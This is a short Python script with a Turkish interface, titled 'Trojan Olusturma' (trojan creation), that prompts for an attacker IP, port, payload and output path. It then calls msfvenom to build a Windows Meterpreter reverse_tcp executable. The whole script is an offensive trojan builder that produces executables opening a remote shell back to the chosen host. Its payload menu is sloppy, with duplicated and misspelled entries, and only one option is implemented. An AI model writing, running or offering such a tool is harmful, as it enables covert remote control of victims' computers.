#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Trojan Olusturma")
print("""
Trojan Oluşturma Programına Hoş Geldiniz.
""")

ip = raw_input("Local veya Dış İp Girin: ")
port = raw_input("Port Girin: ")
print(""" 
windows/meterpreter/reverse_tcp
windows/meterpreter/revers_http
windows/meterpreter/revers_http
""")
payload = raw_input("Payload No Girin: ")
kayityeri = raw_input("Kayit Yeri Girin: ")

if(payload == "1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
